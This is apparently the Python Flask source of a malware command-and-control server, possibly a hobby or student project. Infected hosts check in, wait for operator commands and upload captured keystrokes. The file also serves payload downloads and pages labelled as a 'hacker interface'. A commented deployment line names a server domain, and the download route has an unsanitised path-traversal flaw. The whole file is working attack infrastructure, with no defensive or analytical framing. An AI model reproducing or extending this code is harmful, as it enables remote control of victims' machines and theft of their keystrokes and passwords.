from flask import Flask, request, send_file, render_template, Response
import os, time
import threading

app = Flask(__name__)


''' The hosts dictonary form
  hosts [(ip, host_name)] = {
    'status': 0/1
    'command': string
    'log': string[]
  }
'''
hosts = {}

# server handshake to keep track of each host
@app.route('/handshake', methods = ['POST'])
def handshake():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key] = {'lock' : threading.Lock(), 'command' : '', 'status' : '0', 'log' : ['']}
  hosts[key]['lock'].acquire()
  return 'Request accepted', 200

# the download route for the download command
@app.route('/download', methods = ['POST'])
def download():
  file = request.form['file']
  path = './resources/' + file
  if os.path.exists(path):
    return send_file(path, as_attachment = True)
  else:
    return 'File not found', 404

# the client is waiting here for the commands
@app.route('/ready', methods = ['POST'])
def timeout():
  global hosts
  key = (request.remote_addr, request.form['name'])

  # the host blocks until the command is ready
  hosts[key]['lock'].acquire()
  
  # when the mutex is unlocked the command is sent to the host
  return hosts[key]['command'], 200

@app.route('/pong', methods = ['POST'])
def pong():
  global hosts

  # this is where hosts can send their ping responses 
  # after a response the host status will be set
  key = (request.remote_addr, request.form['name'])
  hosts[key]['status'] = '1'

  return 'Pong sent.', 200

@app.route('/log', methods = ['POST'])
def log_post():
  global hosts
  
  # this is where the host can send it's keylog data
  key = (request.remote_addr, request.form['name'])
  hosts[key]['log'].append(request.form['key'])

  return 'Ok', 200

#interface routes
@app.route('/')
def displayHosts():
  global hosts
  for host in hosts:
    # ping the hosts to see who's up
    hosts[host]['command'] = 'ping'
    hosts[host]['status'] = '0'

    # sending the ping command
    if hosts[host]['lock'].locked():
      hosts[host]['lock'].release()

  time.sleep(1) # waiting 1s for responses

  keys = []
  for ip, name in hosts:
    keys.append((ip, name, hosts[(ip,name)]['status']))

  return render_template('index.html', keys = keys)

@app.route('/send', methods = ['GET'])
def send_form():
  global hosts

  # this is for the hacker interface
  name = request.args.get('name')
  ip = request.args.get('ip')
  
  return render_template('form.html', name = name, ip = ip)

@app.route('/toolkit', methods = ['GET'])
def show_toolkit():
  global hosts

  # this is for the hacker interface
  name = request.args.get('name')
  ip = request.args.get('ip')

  return render_template('toolkit.html', name = name, ip = ip)

@app.route('/send', methods = ['POST'])
def send_process():
  global hosts
  name = request.form['name']
  ip = request.form['ip']
  key = (ip, name)
  command = request.form['command'] 
  
  hosts[key]['command'] = command
  if hosts[key]['lock'].locked():
    hosts[key]['lock'].release()
    return 0
  
  return 1
  
@app.route('/getLog', methods = ['GET', 'POST'])
def getLog():
  global hosts

  if request.method == 'GET':
    name = request.args.get('name')
    ip = request.args.get('ip')
    
    return render_template('log.html', name = name, ip = ip, message="Log data:")
  
  elif request.method == 'POST':
    name = request.form['name']
    ip = request.form['ip']
    key = (ip, name)
    return ''.join(hosts[key]['log'])


# if __name__ == '__main__':
#   app.run(ssl_context=('/etc/letsencrypt/live/malwinator.chickenkiller.com/fullchain.pem', '/etc/letsencrypt/live/malwinator.chickenkiller.com/privkey.pem'), debug=False, host='0.0.0.0', port='8082')

if __name__ == "__main__":
  app.run(host='127.0.0.1', port='8088')
